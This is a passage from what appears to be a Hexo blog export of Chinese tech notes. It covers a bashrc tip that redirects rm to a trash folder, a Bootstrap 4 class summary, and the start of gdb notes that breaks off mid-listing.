<p>不同主题请参考：<a href="https://github.com/ohmyzsh/ohmyzsh">ohmyzsh themes</a></p>
<h3 id="10-防止删库跑路"><a href="#10-防止删库跑路" class="headerlink" title="10. 防止删库跑路"></a>10. 防止删库跑路</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim ~/.bashrc</span><br></pre></td></tr></table></figure>

<p>添加如下内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">alias</span> <span class="built_in">rm</span>=<span class="string">&#x27;echo &quot;please use trash&quot;&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> trash=trashFunc</span><br><span class="line"><span class="built_in">mkdir</span> -p ~/.trash/</span><br><span class="line"><span class="function"><span class="title">trashFunc</span></span>() &#123;</span><br><span class="line">    <span class="built_in">mv</span> <span class="variable">$@</span> ~/.trash/</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">alias</span> clearTrash=clearTrashFunc</span><br><span class="line"><span class="function"><span class="title">clearTrashFunc</span></span>() &#123;</span><br><span class="line">    /bin/rm -rf ~/.trash/*</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修改完，记得使之生效：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>不知道怎么分类的分类</category>
      </categories>
      <tags>
        <tag>虚拟机</tag>
      </tags>
  </entry>
  <entry>
    <title>bootstrap4框架使用总结</title>
    <url>/bootstrap4%E6%A1%86%E6%9E%B6%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>bootstrap 是一个开源的前端框架，主要应用于页面的布局。</p>
<p>官网介绍：</p>
<blockquote>
<p>the world’s most popular framework for building responsive, mobile-first sites</p>
</blockquote>
<p>同时，它也是移动优先的布局框架。</p>
<p>移动优先，指使用bootstrap开发的页面，不仅能用于web显示，还能用于移动端显示。</p>
<span id="more"></span>

<h2 id="CSS布局常用篇"><a href="#CSS布局常用篇" class="headerlink" title="CSS布局常用篇"></a>CSS布局常用篇</h2><h3 id="屏幕自适应"><a href="#屏幕自适应" class="headerlink" title="屏幕自适应"></a>屏幕自适应</h3><p>使用bootstrap中规范好的CSS样式，能使页面根据屏幕大小自适应，但必须要在<code>head</code>部分加入：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="内外边距"><a href="#内外边距" class="headerlink" title="内外边距"></a>内外边距</h3><p>可以设置的属性：</p>
<p><code>m</code> - 设置外边距 <code>margin</code><br><code>p</code> - 设置内边距 <code>padding</code></p>
<p>可以设置的方向：</p>
<p><code>t</code> - 设置上<em>距 <code>*-top</code><br><code>b</code> - 设置下</em>距 <code>*-bottom</code><br><code>l</code> - 设置左<em>距 <code>*-left</code><br><code>r</code> - 设置右</em>距 <code>*-right</code><br><code>x</code> - 设置x方向的*距，即左右边距 both <code>*-left</code> and <code>*-right</code><br><code>y</code> - 设置y方向 both <code>*-top</code> and <code>*-bottom</code><br><code>(none)</code> - 空则表示设置四个方向</p>
<p>可以设置的大小：</p>
<p><code>0</code> - 设置<em>边距为0：for classes that eliminate the margin or padding by setting it to 0<br><code>1</code> - (by default) 设置 the margin or padding to $spacer * .25<br><code>2</code> - (by default) 设置 the margin or padding to $spacer * .5<br><code>3</code> - (by default) 设置 the margin or padding to $spacer<br><code>4</code> - (by default) 设置 the margin or padding to $spacer * 1.5<br><code>5</code> - (by default) 设置 the margin or padding to $spacer * 3<br><code>auto</code> - 设置自动的*<em>外边距</em></em> the <strong>margin</strong> to auto</p>
<p>示例：</p>
<p><code>mr-3</code> 对应 <code>margin-right: 3</code>  3为不定值，随屏幕大小变化。<br><code>py-2</code> 对应 <code>padding-top:2;padding-bottom:2;</code><br>……</p>
<h3 id="块级元素与行内元素的转换"><a href="#块级元素与行内元素的转换" class="headerlink" title="块级元素与行内元素的转换"></a>块级元素与行内元素的转换</h3><p><code>d-inline-block</code> 将块级元素转换为行内块级元素</p>
<h3 id="栅栏布局"><a href="#栅栏布局" class="headerlink" title="栅栏布局"></a>栅栏布局</h3><h4 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h4><p>见官网：<a href="https://getbootstrap.com/docs/4.1/layout/grid/">栅栏布局</a></p>
<h4 id="配合外边距"><a href="#配合外边距" class="headerlink" title="配合外边距"></a>配合外边距</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;row&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-md-4&quot;</span>&gt;</span>.col-md-4<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-md-4 ml-auto&quot;</span>&gt;</span>.col-md-4 .ml-auto<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>效果如下：<br><img src="/bootstrap4%E6%A1%86%E6%9E%B6%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/grid1.png" alt="配合外边距"></p>
<h4 id="偏移"><a href="#偏移" class="headerlink" title="偏移"></a>偏移</h4><p><code>offset-*</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;row&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-4&quot;</span>&gt;</span>.col-md-4<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-4 offset-4&quot;</span>&gt;</span>.col-md-4 .offset-md-4<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="规范子元素的flex"><a href="#规范子元素的flex" class="headerlink" title="规范子元素的flex"></a>规范子元素的flex</h3><p><code>d-flex</code></p>
<h4 id="水平布局"><a href="#水平布局" class="headerlink" title="水平布局"></a>水平布局</h4><p><code>justify-content-*</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;d-flex justify-content-start&quot;</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;d-flex justify-content-end&quot;</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;d-flex justify-content-center&quot;</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;d-flex justify-content-between&quot;</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;d-flex justify-content-around&quot;</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>作用于div子元素。</p>
<p>效果依次为：</p>
<p><img src="/bootstrap4%E6%A1%86%E6%9E%B6%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/flex1.png" alt="flex1"></p>
<h4 id="垂直布局"><a href="#垂直布局" class="headerlink" title="垂直布局"></a>垂直布局</h4><p><code>align-items-*</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;d-flex align-items-start&quot;</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;d-flex align-items-end&quot;</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;d-flex align-items-center&quot;</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;d-flex align-items-baseline&quot;</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;d-flex align-items-stretch&quot;</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>同样作用于div子元素。</p>
<p>效果依次为：</p>
<p><img src="/bootstrap4%E6%A1%86%E6%9E%B6%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/flex2.png" alt="flex2"></p>
<h4 id="充满"><a href="#充满" class="headerlink" title="充满"></a>充满</h4><p><code>flex-fill</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;d-flex&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;p-2 flex-fill&quot;</span>&gt;</span>Flex item with a lot of content<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;p-2 flex-fill&quot;</span>&gt;</span>Flex item<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;p-2 flex-fill&quot;</span>&gt;</span>Flex item<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>作用于当前元素，效果是充满父元素。</p>
<h4 id="增长"><a href="#增长" class="headerlink" title="增长"></a>增长</h4><p><code>flex-grow-*</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;d-flex bd-highlight&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;p-2 flex-grow-1 bd-highlight&quot;</span>&gt;</span>Flex item<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;p-2 bd-highlight&quot;</span>&gt;</span>Flex item<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;p-2 bd-highlight&quot;</span>&gt;</span>Third flex item<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>Use .flex-grow-* utilities to toggle a flex item’s ability to grow to fill available space.</p>
</blockquote>
<p>将当前元素尽可能地增长，效果如下：</p>
<p><img src="/bootstrap4%E6%A1%86%E6%9E%B6%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/flex3.png" alt="flex3"></p>
<h4 id="缩短"><a href="#缩短" class="headerlink" title="缩短"></a>缩短</h4><p><code>flex-shrink-*</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;d-flex bd-highlight&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;p-2 w-100 bd-highlight&quot;</span>&gt;</span>Flex item<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;p-2 flex-shrink-1 bd-highlight&quot;</span>&gt;</span>Flex item<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>Use .flex-shrink-* utilities to toggle a flex item’s ability to shrink if necessary.</p>
</blockquote>
<p>将当前元素有必要地缩短，效果如下：</p>
<p><img src="/bootstrap4%E6%A1%86%E6%9E%B6%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/flex4.png" alt="flex4"></p>
<h3 id="作用当前元素"><a href="#作用当前元素" class="headerlink" title="作用当前元素"></a>作用当前元素</h3><h4 id="当前元素水平布局"><a href="#当前元素水平布局" class="headerlink" title="当前元素水平布局"></a>当前元素水平布局</h4><p>利用外边距可以实现：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ml-auto&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width: 200px;&quot;</span>&gt;</span></span><br><span class="line">  Centered element</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mr-auto&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width: 200px;&quot;</span>&gt;</span></span><br><span class="line">  Centered element</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mx-auto&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width: 200px;&quot;</span>&gt;</span></span><br><span class="line">  Centered element</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>ml-auto</code> 表示 <code>margin-left:auto</code>，效果使得当前元素水平居右。</p>
<p><code>mx-auto</code> 表示左右外边距都为 <code>auto</code>，效果是水平居中。</p>
<h4 id="当前元素垂直布局"><a href="#当前元素垂直布局" class="headerlink" title="当前元素垂直布局"></a>当前元素垂直布局</h4><p><code>align-*</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;align-baseline&quot;</span>&gt;</span>baseline<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;align-top&quot;</span>&gt;</span>top<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;align-middle&quot;</span>&gt;</span>middle<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;align-bottom&quot;</span>&gt;</span>bottom<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;align-text-top&quot;</span>&gt;</span>text-top<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;align-text-bottom&quot;</span>&gt;</span>text-bottom<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>作用于当前元素</strong>，效果如下：</p>
<p><img src="/bootstrap4%E6%A1%86%E6%9E%B6%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/verticalAlign.png" alt="VerticalAlign"></p>
<h2 id="CSS元素规范篇"><a href="#CSS元素规范篇" class="headerlink" title="CSS元素规范篇"></a>CSS元素规范篇</h2><h3 id="规范字体"><a href="#规范字体" class="headerlink" title="规范字体"></a>规范字体</h3><h4 id="字体样式"><a href="#字体样式" class="headerlink" title="字体样式"></a>字体样式</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>You can use the mark tag to <span class="tag">&lt;<span class="name">mark</span>&gt;</span>highlight<span class="tag">&lt;/<span class="name">mark</span>&gt;</span> text.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">del</span>&gt;</span>This line of text is meant to be treated as deleted text.<span class="tag">&lt;/<span class="name">del</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">s</span>&gt;</span>This line of text is meant to be treated as no longer accurate.<span class="tag">&lt;/<span class="name">s</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">ins</span>&gt;</span>This line of text is meant to be treated as an addition to the document.<span class="tag">&lt;/<span class="name">ins</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">u</span>&gt;</span>This line of text will render as underlined<span class="tag">&lt;/<span class="name">u</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">small</span>&gt;</span>This line of text is meant to be treated as fine print.<span class="tag">&lt;/<span class="name">small</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span>&gt;</span>This line rendered as bold text.<span class="tag">&lt;/<span class="name">strong</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">em</span>&gt;</span>This line rendered as italicized text.<span class="tag">&lt;/<span class="name">em</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>效果如下：</p>
<p><img src="/bootstrap4%E6%A1%86%E6%9E%B6%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/%E5%AD%97%E4%BD%93%E6%A0%B7%E5%BC%8F.png" alt="字体样式"></p>
<h4 id="包裹字体"><a href="#包裹字体" class="headerlink" title="包裹字体"></a>包裹字体</h4><p><code>text-wrap</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;text-wrap&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width: 6rem;&quot;</span>&gt;</span></span><br><span class="line">  This text should wrap.</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>字体会自动换行，适用于<strong>规定宽度</strong>的div中的字体。</p>
<p>不包裹字体则是 <code>text-nowarp</code>。</p>
<h4 id="字体过长省略"><a href="#字体过长省略" class="headerlink" title="字体过长省略"></a>字体过长省略</h4><p><code>text-truncate</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;row&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-2 text-truncate&quot;</span>&gt;</span></span><br><span class="line">    Praeterea iter est quasdam res quas ex communi.</span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>For longer content, you can add a .text-truncate class to truncate the text with an ellipsis. Requires display: inline-block or display: block.</p>
</blockquote>
<p>适用于块级元素中的字体。</p>
<h4 id="字体水平位置"><a href="#字体水平位置" class="headerlink" title="字体水平位置"></a>字体水平位置</h4><p><code>text-*</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;text-left&quot;</span>&gt;</span>Left aligned text on all viewport sizes.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;text-center&quot;</span>&gt;</span>Center aligned text on all viewport sizes.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;text-right&quot;</span>&gt;</span>Right aligned text on all viewport sizes.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>效果如下：</p>
<p><img src="/bootstrap4%E6%A1%86%E6%9E%B6%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/%E5%AD%97%E4%BD%93%E6%B0%B4%E5%B9%B3%E5%B8%83%E5%B1%80.png" alt="字体水平布局"></p>
<h3 id="规范列表"><a href="#规范列表" class="headerlink" title="规范列表"></a>规范列表</h3><p><code>list-unstyled</code>     列表无黑点</p>
<p><code>list-inline</code>       行内列表<br><code>list-inline-item</code>  行内列表中的一项</p>
<p>使用如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;list-inline&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;list-inline-item&quot;</span>&gt;</span>Lorem ipsum<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;list-inline-item&quot;</span>&gt;</span>Phasellus iaculis<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;list-inline-item&quot;</span>&gt;</span>Nulla volutpat<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="规范表格"><a href="#规范表格" class="headerlink" title="规范表格"></a>规范表格</h3><p>见官网 <a href="https://getbootstrap.com/docs/4.1/content/tables/">表格</a></p>
<h2 id="CSS组件篇"><a href="#CSS组件篇" class="headerlink" title="CSS组件篇"></a>CSS组件篇</h2><h3 id="块引用"><a href="#块引用" class="headerlink" title="块引用"></a>块引用</h3><p><code>blockquote</code> 设置为块引用<br><code>blockquote-footer</code> 块引用的引脚</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">blockquote</span> <span class="attr">class</span>=<span class="string">&quot;blockquote&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;mb-0&quot;</span>&gt;</span>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer posuere erat a ante.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">footer</span> <span class="attr">class</span>=<span class="string">&quot;blockquote-footer&quot;</span>&gt;</span>Someone famous in <span class="tag">&lt;<span class="name">cite</span> <span class="attr">title</span>=<span class="string">&quot;Source Title&quot;</span>&gt;</span>Source Title<span class="tag">&lt;/<span class="name">cite</span>&gt;</span><span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">blockquote</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>效果如下：</p>
<p><img src="/bootstrap4%E6%A1%86%E6%9E%B6%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/blockquote.png" alt="块引用"></p>
]]></content>
      <categories>
        <category>开发</category>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>Bootstrap</tag>
      </tags>
  </entry>
  <entry>
    <title>gdb基础学习笔记</title>
    <url>/gdb%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
    <content><![CDATA[<h3 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h3><p>自古调试分两派，<code>printf</code>直接输出派 和 <code>gdb</code>调试派。</p>
<p><code>printf</code>派直观暴力，但不全面。</p>
<p><code>gdb</code>派全面却麻烦。</p>
<p>但为了更深入全面的学习，有必要了解<code>gdb</code>这款强大的调试工具。</p>
<span id="more"></span>

<h3 id="1-gdb调试前准备"><a href="#1-gdb调试前准备" class="headerlink" title="1. gdb调试前准备"></a>1. gdb调试前准备</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -g -o hello hello.c</span><br></pre></td></tr></table></figure>

<p>使用<code>gcc</code>编译时，一定要加上参数<code>-g</code>，不然生成的可执行文件<code>hello</code>不能调试，使用<code>(gdb) file hello</code>或<code>gdb hello</code>时，会报错：<code>No symbol table is loaded.  Use the &quot;file&quot; command.</code></p>
<p>(这个结论尚且不准确。)</p>
<h3 id="2-gdb指令"><a href="#2-gdb指令" class="headerlink" title="2. gdb指令"></a>2. gdb指令</h3><p>指令可<code>Tab</code>键补全，可上下键翻阅。</p>
<p>示例源程序如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">fun</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    <span class="type">int</span> val = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (a &gt; b) &#123;</span><br><span class="line">        val = a + b;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        val = a - b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello gdb!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;what is gdb? %d\n&quot;</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> a = <span class="number">1</span>, b=<span class="number">3</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, fun(a, b));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="file"><a href="#file" class="headerlink" title="file"></a>file</h4><p>格式：</p>
<ul>
<li><code>file &lt;可执行文件名&gt;</code>，加载要调试的可执行文件。</li>
</ul>
<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) file hello1</span><br><span class="line">Reading symbols from hello1...done.</span><br></pre></td></tr></table></figure>

<h4 id="list"><a href="#list" class="headerlink" title="list"></a><strong>list</strong></h4><p>格式：</p>
<ul>
<li><code>list &lt;linenum&gt;</code>，显示程序第linenum行周围的源程序</li>
<li><code>list &lt;function&gt;</code> ，显示函数名为function的函数的源程序</li>
<li><code>list</code>，显示当前行周围的源程序(10行)，多次<code>list</code>，会自动向后显示源程序</li>
<li><code>list -</code>，向前显示源程序</li>
</ul>
<p>简写：<code>l</code></p>
<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) l</span><br><span class="line">warning: Source file is more recent than executable.</span><br><span class="line">1       #include&lt;stdio.h&gt;</span><br><span class="line">2</span><br><span class="line">3       int fun(int a, int b) &#123;</span><br><span class="line">4                       int val = 0;</span><br><span class="line">5                       if (a &gt; b) &#123;</span><br><span class="line">6                                       val = a + b;</span><br><span class="line">7                       &#125; else &#123;</span><br><span class="line">8                                       val = a - b;</span><br><span class="line">9                       &#125;</span><br><span class="line">10                      return val;</span><br><span class="line">(gdb) l</span><br><span class="line">11      &#125;</span><br><span class="line">12</span><br><span class="line">13      int main() &#123;</span><br><span class="line">14                      printf(&quot;hello gdb!\n&quot;);</span><br><span class="line">15                      int i;</span><br><span class="line">16                      for (i=0; i&lt;10; i++) &#123;</span><br><span class="line">17                                      printf(&quot;what is gdb? %d\n&quot;, i);</span><br><span class="line">18                      &#125;</span><br><span class="line">19                      return 0;</span><br><span class="line">20      &#125;</span><br><span class="line">(gdb) l -</span><br><span class="line">1  